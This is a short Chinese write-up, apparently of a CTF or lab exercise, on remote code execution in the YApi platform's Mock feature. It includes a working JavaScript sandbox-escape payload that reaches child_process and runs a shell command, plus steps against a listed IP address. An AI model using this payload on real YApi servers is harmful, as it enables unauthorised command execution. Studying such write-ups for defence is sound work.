# yapi代码执行
## 漏洞描述
YAPI接口管理平台是国内某旅行网站的大前端技术中心开源项目，使用mock数据/脚本作为中间交互层，为前端后台开发与测试人员提供更优雅的接口管理服务，该系统被国内较多知名互联网企业所采用。YApi 是高效、易用、功能强大的 api 管理平台。但因为大量用户使用 YAPI的默认配置并允许从外部网络访问 YApi服务，导致攻击者注册用户后，即可通过 Mock功能远程执行任意代

## 影响版本
未知

## 利用流程
1.访问地址：118.193.36.37:39888     注册一个新用户

![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/yapi%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.jpg)
![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/yapi%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/2.jpg)
2.添加项目 -> 项目名字(随意) ->  创建项目 -> 高级Mock -> 开启 -> Mock脚本
```
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
mockJson = process.mainModule.require("child_process").execSync("ls /tmp").toString()
```

![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/yapi%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/3.jpg)
![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/yapi%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/4.jpg)
![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/yapi%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/5.jpg)
![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/yapi%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/6.jpg)
4.预览 查看Mock地址 并访问

![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/yapi%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/7.jpg)
5.得到flag

![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/yapi%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/8.jpg)
